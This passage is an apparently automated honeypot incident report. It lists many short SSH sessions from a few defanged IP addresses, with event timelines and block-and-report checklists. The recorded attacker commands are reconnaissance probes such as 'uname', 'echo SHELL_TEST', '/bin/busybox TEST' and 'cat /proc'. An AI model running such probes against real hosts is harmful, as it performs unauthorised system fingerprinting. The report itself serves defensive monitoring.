| **First Seen** | 2026-06-27 13:24 |
| **Last Seen** | 2026-06-27 13:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:24:01` | `cowrie.session.connect` |
| `2026-06-27 13:24:01` | `cowrie.client.version` |
| `2026-06-27 13:24:01` | `cowrie.client.kex` |
| `2026-06-27 13:24:02` | `cowrie.login.success` |
| `2026-06-27 13:24:03` | `cowrie.session.params` |
| `2026-06-27 13:24:03` | `cowrie.command.input` |
| `2026-06-27 13:24:03` | `cowrie.log.closed` |
| `2026-06-27 13:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f2e2f550b97

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:25 |
| **Last Seen** | 2026-06-27 13:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:25:00` | `cowrie.session.connect` |
| `2026-06-27 13:25:00` | `cowrie.client.version` |
| `2026-06-27 13:25:00` | `cowrie.client.kex` |
| `2026-06-27 13:25:01` | `cowrie.login.success` |
| `2026-06-27 13:25:01` | `cowrie.session.params` |
| `2026-06-27 13:25:01` | `cowrie.command.input` |
| `2026-06-27 13:25:02` | `cowrie.log.closed` |
| `2026-06-27 13:25:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9b060c8279f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:26 |
| **Last Seen** | 2026-06-27 13:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:26:03` | `cowrie.session.connect` |
| `2026-06-27 13:26:03` | `cowrie.client.version` |
| `2026-06-27 13:26:04` | `cowrie.client.kex` |
| `2026-06-27 13:26:04` | `cowrie.login.success` |
| `2026-06-27 13:26:05` | `cowrie.session.params` |
| `2026-06-27 13:26:05` | `cowrie.command.input` |
| `2026-06-27 13:26:05` | `cowrie.log.closed` |
| `2026-06-27 13:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5d0b9b69146

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:27 |
| **Last Seen** | 2026-06-27 13:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:27:02` | `cowrie.session.connect` |
| `2026-06-27 13:27:02` | `cowrie.client.version` |
| `2026-06-27 13:27:02` | `cowrie.client.kex` |
| `2026-06-27 13:27:02` | `cowrie.login.success` |
| `2026-06-27 13:27:03` | `cowrie.session.params` |
| `2026-06-27 13:27:03` | `cowrie.command.input` |
| `2026-06-27 13:27:03` | `cowrie.log.closed` |
| `2026-06-27 13:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dd0e31e9887

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-27 13:27 |
| **Last Seen** | 2026-06-27 13:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:27:27` | `cowrie.session.connect` |
| `2026-06-27 13:27:27` | `cowrie.client.version` |
| `2026-06-27 13:27:28` | `cowrie.client.kex` |
| `2026-06-27 13:27:28` | `cowrie.login.success` |
| `2026-06-27 13:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2934e949f33

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 13:27 |
| **Last Seen** | 2026-06-27 13:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:27:28` | `cowrie.session.connect` |
| `2026-06-27 13:27:28` | `cowrie.client.version` |
| `2026-06-27 13:27:28` | `cowrie.client.kex` |
| `2026-06-27 13:27:30` | `cowrie.login.success` |
| `2026-06-27 13:27:32` | `cowrie.session.params` |
| `2026-06-27 13:27:32` | `cowrie.command.input` |
| `2026-06-27 13:27:32` | `cowrie.log.closed` |
| `2026-06-27 13:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9417dd53a45a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-27 13:27 |
| **Last Seen** | 2026-06-27 13:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:27:28` | `cowrie.session.connect` |
| `2026-06-27 13:27:28` | `cowrie.client.version` |
| `2026-06-27 13:27:28` | `cowrie.client.kex` |
| `2026-06-27 13:27:28` | `cowrie.login.success` |
| `2026-06-27 13:27:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c77e524967a4

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-27 13:27 |
| **Last Seen** | 2026-06-27 13:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:27:38` | `cowrie.session.connect` |
| `2026-06-27 13:27:38` | `cowrie.client.version` |
| `2026-06-27 13:27:38` | `cowrie.client.kex` |
| `2026-06-27 13:27:38` | `cowrie.login.success` |
| `2026-06-27 13:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04771df859d6

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-27 13:27 |
| **Last Seen** | 2026-06-27 13:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:27:39` | `cowrie.session.connect` |
| `2026-06-27 13:27:39` | `cowrie.client.version` |
| `2026-06-27 13:27:39` | `cowrie.client.kex` |
| `2026-06-27 13:27:39` | `cowrie.login.success` |
| `2026-06-27 13:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4084f2b4150

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 13:27 |
| **Last Seen** | 2026-06-27 13:27 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:27:44` | `cowrie.session.connect` |
| `2026-06-27 13:27:45` | `cowrie.client.version` |
| `2026-06-27 13:27:45` | `cowrie.client.kex` |
| `2026-06-27 13:27:51` | `cowrie.login.success` |
| `2026-06-27 13:27:54` | `cowrie.session.params` |
| `2026-06-27 13:27:54` | `cowrie.command.input` |
| `2026-06-27 13:27:55` | `cowrie.log.closed` |
| `2026-06-27 13:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff231498510f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:28 |
| **Last Seen** | 2026-06-27 13:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:28:03` | `cowrie.session.connect` |
| `2026-06-27 13:28:03` | `cowrie.client.version` |
| `2026-06-27 13:28:03` | `cowrie.client.kex` |
| `2026-06-27 13:28:03` | `cowrie.login.success` |
| `2026-06-27 13:28:04` | `cowrie.session.params` |
| `2026-06-27 13:28:04` | `cowrie.command.input` |
| `2026-06-27 13:28:04` | `cowrie.log.closed` |
| `2026-06-27 13:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee521045665c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:29 |
| **Last Seen** | 2026-06-27 13:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:29:06` | `cowrie.session.connect` |
| `2026-06-27 13:29:06` | `cowrie.client.version` |
| `2026-06-27 13:29:06` | `cowrie.client.kex` |
| `2026-06-27 13:29:06` | `cowrie.login.success` |
| `2026-06-27 13:29:07` | `cowrie.session.params` |
| `2026-06-27 13:29:07` | `cowrie.command.input` |
| `2026-06-27 13:29:07` | `cowrie.log.closed` |
| `2026-06-27 13:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-535689bb2a95

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:30 |
| **Last Seen** | 2026-06-27 13:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:30:04` | `cowrie.session.connect` |
| `2026-06-27 13:30:04` | `cowrie.client.version` |
| `2026-06-27 13:30:04` | `cowrie.client.kex` |
| `2026-06-27 13:30:04` | `cowrie.login.success` |
| `2026-06-27 13:30:05` | `cowrie.session.params` |
| `2026-06-27 13:30:05` | `cowrie.command.input` |
| `2026-06-27 13:30:05` | `cowrie.log.closed` |
| `2026-06-27 13:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7803a705fcf

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:31 |
| **Last Seen** | 2026-06-27 13:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:31:03` | `cowrie.session.connect` |
| `2026-06-27 13:31:03` | `cowrie.client.version` |
| `2026-06-27 13:31:04` | `cowrie.client.kex` |
| `2026-06-27 13:31:04` | `cowrie.login.success` |
| `2026-06-27 13:31:05` | `cowrie.session.params` |
| `2026-06-27 13:31:05` | `cowrie.command.input` |
| `2026-06-27 13:31:05` | `cowrie.log.closed` |
| `2026-06-27 13:31:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8719991f592

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]100` |
| **First Seen** | 2026-06-27 13:31 |
| **Last Seen** | 2026-06-27 13:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:31:44` | `cowrie.session.connect` |
| `2026-06-27 13:31:45` | `cowrie.login.success` |
| `2026-06-27 13:31:45` | `cowrie.session.params` |
| `2026-06-27 13:31:46` | `cowrie.command.input` |
| `2026-06-27 13:31:46` | `cowrie.command.input` |
| `2026-06-27 13:31:47` | `cowrie.command.input` |
| `2026-06-27 13:31:47` | `cowrie.command.input` |
| `2026-06-27 13:31:47` | `cowrie.command.failed` |
| `2026-06-27 13:31:48` | `cowrie.log.closed` |
| `2026-06-27 13:31:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]100` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e46ea448cd34

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:32 |
| **Last Seen** | 2026-06-27 13:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:32:04` | `cowrie.session.connect` |
| `2026-06-27 13:32:04` | `cowrie.client.version` |
| `2026-06-27 13:32:05` | `cowrie.client.kex` |
| `2026-06-27 13:32:05` | `cowrie.login.success` |
| `2026-06-27 13:32:06` | `cowrie.session.params` |
| `2026-06-27 13:32:06` | `cowrie.command.input` |
| `2026-06-27 13:32:06` | `cowrie.log.closed` |
| `2026-06-27 13:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33f28dd07813

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:33 |
| **Last Seen** | 2026-06-27 13:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:33:05` | `cowrie.session.connect` |
| `2026-06-27 13:33:05` | `cowrie.client.version` |
| `2026-06-27 13:33:05` | `cowrie.client.kex` |
| `2026-06-27 13:33:06` | `cowrie.login.success` |
| `2026-06-27 13:33:06` | `cowrie.session.params` |
| `2026-06-27 13:33:06` | `cowrie.command.input` |
| `2026-06-27 13:33:07` | `cowrie.log.closed` |
| `2026-06-27 13:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efae8dfea8bf

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:34 |
| **Last Seen** | 2026-06-27 13:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:34:10` | `cowrie.session.connect` |
| `2026-06-27 13:34:10` | `cowrie.client.version` |
| `2026-06-27 13:34:10` | `cowrie.client.kex` |
| `2026-06-27 13:34:10` | `cowrie.login.success` |
| `2026-06-27 13:34:11` | `cowrie.session.params` |
| `2026-06-27 13:34:11` | `cowrie.command.input` |
| `2026-06-27 13:34:11` | `cowrie.log.closed` |
| `2026-06-27 13:34:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3dda74c6c66

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:35 |
| **Last Seen** | 2026-06-27 13:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:35:14` | `cowrie.session.connect` |
| `2026-06-27 13:35:14` | `cowrie.client.version` |
| `2026-06-27 13:35:14` | `cowrie.client.kex` |
| `2026-06-27 13:35:15` | `cowrie.login.success` |
| `2026-06-27 13:35:15` | `cowrie.session.params` |
| `2026-06-27 13:35:15` | `cowrie.command.input` |
| `2026-06-27 13:35:15` | `cowrie.log.closed` |
| `2026-06-27 13:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37703131ab04

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:36 |
| **Last Seen** | 2026-06-27 13:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:36:18` | `cowrie.session.connect` |
| `2026-06-27 13:36:18` | `cowrie.client.version` |
| `2026-06-27 13:36:19` | `cowrie.client.kex` |
| `2026-06-27 13:36:19` | `cowrie.login.success` |
| `2026-06-27 13:36:20` | `cowrie.session.params` |
| `2026-06-27 13:36:20` | `cowrie.command.input` |
| `2026-06-27 13:36:20` | `cowrie.log.closed` |
| `2026-06-27 13:36:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aae328161f41

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:37 |
| **Last Seen** | 2026-06-27 13:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:37:21` | `cowrie.session.connect` |
| `2026-06-27 13:37:21` | `cowrie.client.version` |
| `2026-06-27 13:37:21` | `cowrie.client.kex` |
| `2026-06-27 13:37:21` | `cowrie.login.success` |
| `2026-06-27 13:37:22` | `cowrie.session.params` |
| `2026-06-27 13:37:22` | `cowrie.command.input` |
| `2026-06-27 13:37:22` | `cowrie.log.closed` |
| `2026-06-27 13:37:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c1e4fd132e3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:38 |
| **Last Seen** | 2026-06-27 13:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:38:27` | `cowrie.session.connect` |
| `2026-06-27 13:38:27` | `cowrie.client.version` |
| `2026-06-27 13:38:27` | `cowrie.client.kex` |
| `2026-06-27 13:38:28` | `cowrie.login.success` |
| `2026-06-27 13:38:28` | `cowrie.session.params` |
| `2026-06-27 13:38:28` | `cowrie.command.input` |
| `2026-06-27 13:38:29` | `cowrie.log.closed` |
| `2026-06-27 13:38:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a70b0b00db0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 13:39 |
| **Last Seen** | 2026-06-27 13:39 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:39:24` | `cowrie.session.connect` |
| `2026-06-27 13:39:25` | `cowrie.client.version` |
| `2026-06-27 13:39:25` | `cowrie.client.kex` |
| `2026-06-27 13:39:31` | `cowrie.login.success` |
| `2026-06-27 13:39:35` | `cowrie.session.params` |
| `2026-06-27 13:39:35` | `cowrie.command.input` |
| `2026-06-27 13:39:37` | `cowrie.log.closed` |
| `2026-06-27 13:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ed51bba25a9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:39 |
| **Last Seen** | 2026-06-27 13:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:39:31` | `cowrie.session.connect` |
| `2026-06-27 13:39:31` | `cowrie.client.version` |
| `2026-06-27 13:39:31` | `cowrie.client.kex` |
| `2026-06-27 13:39:32` | `cowrie.login.success` |
| `2026-06-27 13:39:33` | `cowrie.session.params` |
| `2026-06-27 13:39:33` | `cowrie.command.input` |
| `2026-06-27 13:39:33` | `cowrie.log.closed` |
| `2026-06-27 13:39:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e290cfb7e57c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:40 |
| **Last Seen** | 2026-06-27 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:40:33` | `cowrie.session.connect` |
| `2026-06-27 13:40:33` | `cowrie.client.version` |
| `2026-06-27 13:40:33` | `cowrie.client.kex` |
| `2026-06-27 13:40:34` | `cowrie.login.success` |
| `2026-06-27 13:40:34` | `cowrie.session.params` |
| `2026-06-27 13:40:34` | `cowrie.command.input` |
| `2026-06-27 13:40:35` | `cowrie.log.closed` |
| `2026-06-27 13:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64f84da64748

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:41 |
| **Last Seen** | 2026-06-27 13:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:41:35` | `cowrie.session.connect` |
| `2026-06-27 13:41:35` | `cowrie.client.version` |
| `2026-06-27 13:41:35` | `cowrie.client.kex` |
| `2026-06-27 13:41:36` | `cowrie.login.success` |
| `2026-06-27 13:41:37` | `cowrie.session.params` |
| `2026-06-27 13:41:37` | `cowrie.command.input` |
| `2026-06-27 13:41:37` | `cowrie.log.closed` |
| `2026-06-27 13:41:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c66637d9bbbb

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 13:42 |
| **Last Seen** | 2026-06-27 13:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:42:09` | `cowrie.session.connect` |
| `2026-06-27 13:42:10` | `cowrie.client.version` |
| `2026-06-27 13:42:10` | `cowrie.client.kex` |
| `2026-06-27 13:42:12` | `cowrie.login.success` |
